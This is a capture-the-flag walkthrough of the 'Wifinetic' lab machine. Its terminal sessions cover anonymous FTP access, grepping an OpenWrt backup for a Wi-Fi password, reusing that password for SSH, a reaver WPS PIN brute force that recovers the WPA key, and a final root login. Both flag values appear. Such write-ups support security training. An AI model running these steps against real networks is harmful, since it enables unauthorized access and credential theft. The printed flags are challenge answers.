# Wifinetic
Wifinetic is an easy difficulty Linux machine which presents an intriguing network challenge, focusing on wireless security and network monitoring. An exposed FTP service has anonymous authentication enabled which allows us to download available files. One of the file being an OpenWRT backup which contains Wireless Network configuration that discloses an Access Point password. The contents of shadow or passwd files further disclose usernames on the server. With this information, a password reuse attack can be carried out on the SSH service, allowing us to gain a foothold as the netadmin user. Using standard tools and with the provided wireless interface in monitoring mode, we can brute force the WPS PIN for the Access Point to obtain the pre-shared key ( PSK ). The pass phrase can be reused on SSH service to obtain root access on the server.

## Enumeration
### Port Scanning
On the system we find the open ports 21 (ftp), 22 (ssh) and 53 (dns):
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/wifinetic]
└─$ nmap $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 10:22 EDT
Nmap scan report for 10.10.11.247
Host is up (0.047s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain

Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds

┌──(kali㉿kali)-[~/Desktop/hackthebox/wifinetic]
└─$ nmap -sC -sV -oN nmap/general $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 10:22 EDT
Nmap scan report for 10.10.11.247
Host is up (0.077s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.81
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.98 seconds

┌──(kali㉿kali)-[~/Desktop/hackthebox/wifinetic]
└─$ nmap -p- -oN nmap/all_ports $IP  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 10:23 EDT
Nmap scan report for 10.10.11.247
Host is up (0.028s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain

Nmap done: 1 IP address (1 host up) scanned in 24.23 seconds

┌──(kali㉿kali)-[~/Desktop/hackthebox/wifinetic]
└─$ 
```

### FTP
The target runs vsFTPd 3.0.3. There is no useful attacking vector for this version. But the anonymous login is allowed:
```
┌──(kali㉿kali)-[~]
└─$ ftp $IP
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
Name (10.10.11.247:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al 
229 Entering Extended Passive Mode (|||43487|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 11 15:25 .
drwxr-xr-x    2 ftp      ftp          4096 Sep 11 15:25 ..
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.
ftp> 
```

#### Downloading Files
In the pdf and txt files we read, that there will be a migration from an OpenWRT system to Debian. OpenWRT is a linux based OS for embedded devices especially like routers.

In the ftp files is a back archive from that OpenWRT device. Downloading and extracting it reveals the `/etc` directory from the device:
```
┌──(kali㉿kali)-[~/…/hackthebox/wifinetic/ftp/etc]
└─$ ls -al
total 72
drwxr-xr-x 7 kali kali 4096 Sep 11 11:23 .
drwxr-xr-x 3 kali kali 4096 Sep 21 10:36 ..
drwxr-xr-x 2 kali kali 4096 Sep 11 11:22 config
drwxr-xr-x 2 kali kali 4096 Sep 11 11:22 dropbear
-rw-r--r-- 1 kali kali  227 Jul 26 06:08 group
-rw-r--r-- 1 kali kali  110 Apr 27 16:28 hosts
-rw-r--r-- 1 kali kali  183 Apr 27 16:28 inittab
drwxr-xr-x 2 kali kali 4096 Sep 11 11:22 luci-uploads
drwxr-xr-x 2 kali kali 4096 Sep 11 11:22 nftables.d
drwxr-xr-x 3 kali kali 4096 Sep 11 11:22 opkg
-rw-r--r-- 1 kali kali  420 Jul 26 06:09 passwd
-rw-r--r-- 1 kali kali 1046 Apr 27 16:28 profile
-rw-r--r-- 1 kali kali  132 Apr 27 16:28 rc.local
-rw-r--r-- 1 kali kali    9 Apr 27 16:28 shells
-rw-r--r-- 1 kali kali  475 Apr 27 16:28 shinit
-rw-r--r-- 1 kali kali   80 Apr 27 16:28 sysctl.conf
-rw-r--r-- 1 kali kali  745 Jul 24 15:15 uhttpd.crt
-rw-r--r-- 1 kali kali  121 Jul 24 15:15 uhttpd.key

┌──(kali㉿kali)-[~/…/hackthebox/wifinetic/ftp/etc]
└─$ 
```

## OpenWRT Backup
In the backup are configuration files for the services from the OpenWRT device like for example ssh (dropbear) or http (uhttpd). As well the `etc/passwd`, but without the `etc/shadow`. But we find a user in there:
```
┌──(kali㉿kali)-[~/…/hackthebox/wifinetic/ftp/etc]
└─$ cat passwd     
[...]
netadmin:x:999:999::/home/netadmin:/bin/false

┌──(kali㉿kali)-[~/…/hackthebox/wifinetic/ftp/etc]
└─$ 
```

Since they are migrating the system, it is very likely that the user will be used again. But we still need a password.

Maybe there is something relevant in one of those config files:
```
┌──(kali㉿kali)-[~/…/hackthebox/wifinetic/ftp/etc]
└─$ grep -i -r pass *
config/rpcd:    option password '$p$root'
config/dropbear:        option PasswordAuth 'on'
config/dropbear:        option RootPasswordAuth 'on'
config/wireless:        option key 'VeRyUniUqWiFIPasswrd1!'
config/wireless:        option key 'VeRyUniUqWiFIPasswrd1!'
config/luci:    option passwd '/etc/passwd'
profile:export HOME=$(grep -e "^${USER:-root}:" /etc/passwd | cut -d ":" -f 6)
profile:There is no root password defined on this device!
profile:Use the "passwd" command to set up a new password

┌──(kali㉿kali)-[~/…/hackthebox/wifinetic/ftp/etc]
└─$ 
```

There is a password in the `etc/config/wireless` file, called `VeRyUniUqWiFIPasswrd1!`. This config is for the WLAN configuration of the device. So the password shouldn't give us access with the netadmin user. Or?

Because I didn't find something else in the backup files and the password looks really pretty unique, I tried the login anyway. Aaaand it was successful:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/wifinetic]
└─$ ssh netadmin@$IP      
netadmin@10.10.11.247's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Sep 21 15:35:50 2023 from 10.10.16.81
netadmin@wifinetic:~$ 
```

### User flag
Logged in, we find directly the user flag:
```
netadmin@wifinetic:~$ ls -al 
total 40
drwxr-xr-x  6 netadmin netadmin 4096 Sep 21 15:32 .
drwxr-xr-x 24 root     root     4096 Sep 11 16:58 ..
lrwxrwxrwx  1 root     root        9 Sep 11 16:08 .bash_history -> /dev/null
-rw-r--r--  1 netadmin netadmin  220 Feb 25  2020 .bash_logout
-rw-r--r--  1 netadmin netadmin 3771 Feb 25  2020 .bashrc
drwx------  2 netadmin netadmin 4096 Sep 11 16:40 .cache
drwx------  2 netadmin netadmin 4096 Sep 21 15:28 .gnupg
drwxrwxr-x  3 netadmin netadmin 4096 Sep 21 15:32 .local
-rw-r--r--  1 netadmin netadmin  807 Feb 25  2020 .profile
drwxrwxr-x  2 netadmin netadmin 4096 Sep 21 09:27 tmp
-rw-r-----  1 root     netadmin   33 Sep 21 04:13 user.txt
netadmin@wifinetic:~$ cat user.txt 
61e0a25a82f59e96b7c2a472516b1a97
netadmin@wifinetic:~$ 
```

## System enumeration
We find two interesting configurations on the system. First, there are a few wireless network interfaces configured on the system:
```
netadmin@wifinetic:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:34d5  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:34d5  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:34:d5  txqueuelen 1000  (Ethernet)
        RX packets 413546  bytes 29919663 (29.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 408696  bytes 38278709 (38.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 130886  bytes 8555823 (8.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 130886  bytes 8555823 (8.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 528204  bytes 93135349 (93.1 MB)
        RX errors 0  dropped 527740  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 17912  bytes 1768360 (1.7 MB)
        RX errors 0  dropped 2418  overruns 0  frame 0
        TX packets 20638  bytes 2473426 (2.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 5138  bytes 714821 (714.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 17853  bytes 2081208 (2.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

netadmin@wifinetic:~$ 
```

The second thing is, that we have the capabilities to execute `reaver`:
### Capabilities
```
══╣ Parent process capabilities
CapInh:       0x0000000000000000=                                                                                                                            
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```
From https://www.kali.org/tools/reaver/:

_Reaver performs a brute force attack against an access point’s WiFi Protected Setup pin number. Once the WPS pin is found, the WPA PSK can be recovered and alternately the AP’s wireless settings can be reconfigured._

### Network interfaces
Wireless settings are typically stored in `/etc/wpa_supplicant.conf`, but we can't access it.

Anyway, we can further enumerate the interfaces with `iwconfig` and `iw dev`:
```
netadmin@wifinetic:~$ iwconfig
mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlan2     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
eth0      no wireless extensions.

wlan1     IEEE 802.11  ESSID:"OpenWrt"  
          Mode:Managed  Frequency:2.412 GHz  Access Point: 02:00:00:00:00:00   
          Bit Rate:12 Mb/s   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=70/70  Signal level=-30 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:8   Missed beacon:0

lo        no wireless extensions.

hwsim0    no wireless extensions.

wlan0     IEEE 802.11  Mode:Master  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
netadmin@wifinetic:~$ 
```

```
netadmin@wifinetic:~$ iw dev
phy#2
        Interface mon0
                ifindex 7
                wdev 0x200000002
                addr 02:00:00:00:02:00
                type monitor
                txpower 20.00 dBm
        Interface wlan2
                ifindex 5
                wdev 0x200000001
                addr 02:00:00:00:02:00
                type managed
                txpower 20.00 dBm
phy#1
        Unnamed/non-netdev interface
                wdev 0x1000004be
                addr 42:00:00:00:01:00
                type P2P-device
                txpower 20.00 dBm
        Interface wlan1
                ifindex 4
                wdev 0x100000001
                addr 02:00:00:00:01:00
                ssid OpenWrt
                type managed
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
phy#0
        Interface wlan0
                ifindex 3
                wdev 0x1
                addr 02:00:00:00:00:00
                ssid OpenWrt
                type AP
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
netadmin@wifinetic:~$ 
```
The system has three physical devices connected:
* `phy#2` shows an interface in monitoring mode (`mon0`). This mode is used to capture or analyze WLAN packages.
* `phy#1` has an interface called `wlan1` with the type _managed_. So this is usually a device that is connected to the access point.
* The last device `phy#0` shows the interface `wlan0` with the type _AP_. So this is the access point and is probably interesting for us.

### WPS cracking
Since we have the capabilities to execute `reaver` we can try to crack the WPS pin of the access point interface `wlan0`:
```
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
netadmin@wifinetic:~$
```
And we got another unique password, that could be relevant.

## Root flag
We can try to `su` with that password:
```
netadmin@wifinetic:~$ su
Password: 
root@wifinetic:/home/netadmin# 
```

Now we can get the root flag:
```
root@wifinetic:~# ls -al 
total 40
drwx------  7 root root 4096 Sep 11 17:24 .
drwxr-xr-x 20 root root 4096 Sep 11 16:40 ..
drwxr-xr-x  3 root root 4096 Aug  8 15:16 .ansible
lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Aug  8 15:16 .cache
drwxr-xr-x  3 root root 4096 Aug  8 15:16 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
lrwxrwxrwx  1 root root    9 Sep  7 14:19 .python_history -> /dev/null
-rw-r-----  1 root root   33 Sep 25 00:36 root.txt
drwxr-xr-x  3 root root 4096 Aug  8 15:16 snap
drwx------  2 root root 4096 Aug  8 15:16 .ssh
root@wifinetic:~# cat root.txt 
b2bda4493ad562cef3f389ea1aca8587
root@wifinetic:~# 
```